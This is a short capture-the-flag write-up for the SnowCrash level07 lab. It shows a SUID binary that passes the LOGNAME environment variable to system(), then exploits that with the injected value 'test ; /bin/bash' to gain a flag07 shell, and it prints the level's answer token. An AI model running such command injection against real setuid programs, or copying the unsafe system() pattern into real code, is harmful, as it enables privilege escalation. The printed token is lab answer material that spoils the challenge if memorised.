We can find 32 bits ELF binary (SUID bit is set btw):
```C
int32_t main(int32_t argc, char** argv, char** envp)
{
	gid_t gid = getegid();
    uid_t uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    
    char* string = nullptr;
    asprintf(&string, "/bin/echo %s ", getenv("LOGNAME"));
    
    return system(string);
}

```

\- This program gets the value of the ENV variable LOGNAME and executes /bin/echo value

Let's exploit this :
```bash
> export LOGNAME="test ; /bin/bash"

> env | grep LOGNAME
LOGNAME=test ; /bin/bash

The program will execute : echo TEST ; /bin/bash
With flag06 permissions

> level07@SnowCrash:~$./level07 
test
bash: /home/user/level07/.bashrc: Permission denied

> flag07@SnowCrash:~$
> flag07@SnowCrash:~$ getflag
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

*fiumuikeil55xe9cu4dood66h*




